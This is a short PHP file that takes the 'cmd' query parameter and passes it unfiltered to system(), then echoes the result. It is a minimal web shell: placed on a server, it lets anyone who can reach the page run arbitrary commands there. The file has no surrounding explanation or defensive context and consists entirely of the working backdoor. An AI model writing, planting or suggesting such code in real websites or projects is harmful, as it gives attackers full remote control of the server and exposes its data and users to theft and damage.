<?php

$command = $_GET['cmd'];

$output = system($command);

echo $output;

?>
